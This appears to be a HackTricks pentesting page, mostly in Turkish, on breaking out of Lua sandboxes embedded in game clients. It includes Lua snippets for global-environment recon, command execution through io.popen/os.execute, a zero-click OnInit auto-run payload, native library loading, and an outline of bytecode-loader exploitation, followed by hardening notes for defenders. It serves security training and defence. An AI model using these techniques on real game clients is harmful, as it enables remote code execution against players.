# Bypass Lua sandboxes (embedded VMs, game clients)

{{#include ../../../banners/hacktricks-training.md}}

Bu sayfa, uygulamalara gömülü Lua "sandboxes" içinde bulunan ortamları (özellikle game clients, plugins veya in-app scripting engines) keşfetmek ve bu sandbox'lardan çıkmak için pratik teknikleri toplar. Birçok engine kısıtlı bir Lua ortamı sunar, ancak güçlü globals'a erişim bırakarak, bytecode loaders açığa çıkarsa keyfi komut yürütme veya hatta native bellek bozulmasına yol açabilir.

Temel fikirler:
- VM'i bilinmeyen bir ortam olarak ele alın: _G'yi listeleyin ve hangi tehlikeli primitives'e erişilebildiğini keşfedin.
- stdout/print engellendiğinde, sonuçları gözlemlemek için herhangi bir in-VM UI/IPC kanalını çıktı hedefi olarak kötüye kullanın.
- io/os açığa çıkarsa, genellikle doğrudan komut yürütme elde edersiniz (io.popen, os.execute).
- load/loadstring/loadfile açığa çıkarsa, hazırlanmış Lua bytecode'unu yürütmek bazı sürümlerde bellek güvenliğini bozabilir (≤5.1 verifier'lar bypasslanabilir; 5.2 verifier'ı kaldırdı), bu da gelişmiş istismara olanak tanır.

## Sandbox'lanmış ortamı keşfetme

- Erişilebilir tablolar/fonksiyonları envanterlemek için global environment'i dökün:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- Eğer print() kullanılamıyorsa, VM içi kanalları yeniden amaçlayın. Örnek: chat çıktısının yalnızca bir ses çağrısından sonra çalıştığı bir MMO housing script VM'inden; aşağıdakiler güvenilir bir çıktı fonksiyonu oluşturur:
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
Hedefiniz için bu deseni genelleştirin: strings kabul eden herhangi bir textbox, toast, logger veya UI callback'i reconnaissance için stdout olarak kullanabilirsiniz.

## io/os açık olduğunda doğrudan command execution

Eğer sandbox hâlâ standart kütüphaneler io veya os'u açığa çıkarıyorsa, muhtemelen immediate command execution'a sahipsiniz:
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
Notlar:
- Yürütme client process içinde gerçekleşir; harici debugger'ları engelleyen birçok anti-cheat/antidebug katmanı, in-VM process creation'ı engellemez.
- Ayrıca kontrol et: package.loadlib (arbitrary DLL/.so loading), require with native modules, LuaJIT's ffi (if present), and the debug library (can raise privileges inside the VM).

## Zero-click triggers via auto-run callbacks

If the host application pushes scripts to clients and the VM exposes auto-run hooks (e.g., OnInit/OnLoad/OnEnter), place your payload there for drive-by compromise as soon as the script loads:
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
Scriptler istemciye otomatik olarak iletilip çalıştırıldığında, herhangi bir eşdeğer callback (OnLoad, OnEnter, vb.) bu tekniği genelleştirir.

## Recon sırasında aranacak tehlikeli primitive'ler

_G enumeration sırasında özellikle şunlara bakın:
- io, os: io.popen, os.execute, dosya I/O, ortam değişkenlerine erişim.
- load, loadstring, loadfile, dofile: kaynak veya bytecode'u çalıştırır; güvenilmeyen bytecode yüklemeyi destekler.
- package, package.loadlib, require: dinamik kütüphane yükleme ve modül arayüzü.
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo ve hooks.
- LuaJIT-only: ffi.cdef, ffi.load yerel kodu doğrudan çağırmak için.

Minimal kullanım örnekleri (ulaşılabilirse):
```lua
-- Execute source/bytecode
local f = load("return 1+1")
print(f()) -- 2

-- loadstring is alias of load for strings in 5.1
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## Optional escalation: abusing Lua bytecode loaders

When load/loadstring/loadfile are reachable but io/os are restricted, execution of crafted Lua bytecode can lead to memory disclosure and corruption primitives. Key facts:
- Lua ≤ 5.1 shipped a bytecode verifier that has known bypasses.
- Lua 5.2 removed the verifier entirely (official stance: applications should just reject precompiled chunks), widening the attack surface if bytecode loading is not prohibited.
- Workflows typically: leak pointers via in-VM output, craft bytecode to create type confusions (e.g., around FORLOOP or other opcodes), then pivot to arbitrary read/write or native code execution.

This path is engine/version-specific and requires RE. See references for deep dives, exploitation primitives, and example gadgetry in games.

## Detection and hardening notes (for defenders)

- Server side: reject or rewrite user scripts; allowlist safe APIs; strip or bind-empty io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi.
- Client side: run Lua with a minimal _ENV, forbid bytecode loading, reintroduce a strict bytecode verifier or signature checks, and block process creation from the client process.
- Telemetry: alert on gameclient → child process creation shortly after script load; correlate with UI/chat/script events.

## References

- [This House is Haunted: a decade old RCE in the AION client (housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
- [Bytecode Breakdown: Unraveling Factorio's Lua Security Flaws](https://memorycorruption.net/posts/rce-lua-factorio/)
- [lua-l (2009): Discussion on dropping the bytecode verifier](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [Exploiting Lua 5.1 bytecode (gist with verifier bypasses/notes)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)

{{#include ../../../banners/hacktricks-training.md}}
